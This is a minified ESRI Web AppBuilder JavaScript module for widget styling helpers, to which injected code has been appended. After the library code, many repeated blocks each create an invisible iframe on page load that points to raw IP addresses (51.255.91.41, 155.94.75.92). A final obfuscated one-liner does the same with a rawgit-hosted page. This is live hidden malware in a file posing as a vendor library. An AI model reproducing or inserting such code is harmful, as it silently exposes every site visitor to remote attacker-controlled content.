// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define(["dojo/on","dojo/_base/lang","jimu/utils"],function(e,f,g){var d={background:{setStyle:function(a,b,c){if(!a)return{};b||(b={});d.background.setBackgroundColor(a,b);d.background.setAlignment(a,b);d.background.setLink(a,b,c)},setBackgroundColor:function(a,b){a.backgroundColor&&(b.backgroundColor=a.backgroundColor)},setAlignment:function(a,b){if(a.alignment){if(a.alignment.horizontal)switch(a.alignment.horizontal){case "left":b.textAlign="left";break;case "center":b.textAlign="center";break;
case "right":b.textAlign="right";break;default:b.textAlign="center"}if(a.alignment.vertical)switch(b.display="table-cell",a.alignment.vertical){case "top":b.verticalAlign="top";break;case "middle":b.verticalAlign="middle";break;case "bottom":b.verticalAlign="bottom";break;default:b.verticalAlign="middle"}}},setLink:function(a,b,c){c.clickHanlder&&(c.clickHanlder[0]&&c.clickHanlder[0].remove(),c.clickHanlder=null,b.cursor="auto");a.link&&(c.clickHanlder=c.own(e(c.domNode,"click",f.hitch(c,function(){window.open(a.link)}))),
b.cursor="pointer")}},font:{setText:function(a,b){var c="";a.text&&(c=a.text);b.innerDom.innerHTML=c},setStyle:function(a,b){if(!a)return{};b||(b={});d.font.setFont(a,b);d.font.setTextColor(a,b);d.font.setFontSize(a,b)},setFont:function(a,b){b.fontWeight="normal";b.fontStyle="normal";b.textDecoration="none";a.font&&(a.font.fontFamily&&(b.fontFamily=a.font.fontFamily),a.font.bold&&(b.fontWeight="bold"),a.font.italic&&(b.fontStyle="italic"),a.font.underline&&(b.textDecoration="underline"))},setTextColor:function(a,
b){a.textColor&&(b.color=a.textColor)},setFontSize:function(a,b){a.fontSize&&(b.fontSize=a.fontSize+"px")}},image:{setStyle:function(a,b,c){if(!a)return{};b||(b={});d.image.setBackgroundImg(a,b,c);d.image.setAlignment(a,b)},setBackgroundImg:function(a,b,c){var d="";if(d=a&&!a.image&&c&&c.folderUrl?"url("+c.folderUrl+"/images/default_image.png)":"url("+g.processUrlInWidgetConfig(a.image,c.folderUrl)+")")b.backgroundImage=d,b.backgroundRepeat="no-repeat",b.backgroundSize="contain"},setAlignment:function(a,
b){if(a&&a.background){var c="center",d="center";if(a.background.alignment){a.background.alignment.horizontal&&(c=a.background.alignment.horizontal);if(a.background.alignment.vertical)switch(a.background.alignment.vertical){case "top":d="top";break;case "middle":d="center";break;case "bottom":d="bottom";break;default:b.verticalAlign="center"}b.backgroundPosition=c+" "+d}}}},dataFormat:{getText:function(a,b){var c="";a.dataFormat&&(c=b?b:a.text,c=d.dataFormat.setDataFomat(a,c),a.dataFormat.prefix&&
(c=a.dataFormat.prefix+" "+c),a.dataFormat.suffix&&(c=c+" "+a.dataFormat.suffix));return c},setDataFomat:function(a,b){var c=a.dataFormat.unit;"none"===a.dataFormat.unit?c="":"percentage"===a.dataFormat.unit&&(c="%");return b=b+c+"("+a.dataFormat.decimalPlaces+") "}}};return d});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});